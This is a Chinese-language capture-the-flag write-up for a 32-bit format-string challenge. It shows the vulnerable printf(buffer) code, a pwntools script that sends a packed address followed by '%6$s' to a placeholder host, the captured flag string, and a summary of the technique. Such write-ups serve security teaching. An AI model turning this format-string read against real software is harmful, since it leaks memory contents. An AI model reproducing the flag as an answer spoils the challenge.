# fma

## 题目简述

32 位程序把全局 Flag 地址直接打印出来，再读取最多 99 字节输入并执行 `printf(buffer)`。由于用户数据被当作格式串，攻击者可以把已知地址放在栈上，并用 `%s` 解引用该地址读取字符串。

## 解题过程

关键漏洞为：

```c
printf("Flag is at %p\n", &flag);
fgets(buffer, sizeof(buffer), stdin);
printf(buffer);
```

通过 `%p` 探测可确认输入首部地址位于第 6 个格式串参数。把程序输出的 Flag 地址按 32 位小端序放入 payload，后接 `%6$s`：

```python
from pwn import *

context.arch = "i386"
p = remote("HOST", PORT)
flag_addr = int(p.recvline().split()[-1], 16)
p.recvuntil(b"Enter your input:")
p.sendline(p32(flag_addr) + b"%6$s")
print(p.recvall())
```

得到：

```text
greyhats{f0rmAt_5trin9_vuln3rabi1ities_4r3_d4ngerous}
```

## 方法总结

- 核心技巧：利用格式化字符串 `%n$s` 把栈上的攻击者地址作为字符串指针读取。
- 识别信号：`printf(user_input)`、程序主动泄露目标地址、32 位调用约定使参数可从栈定位。
- 复用要点：先用标记值和 `%p` 确认参数偏移；地址打包宽度必须与目标架构一致。
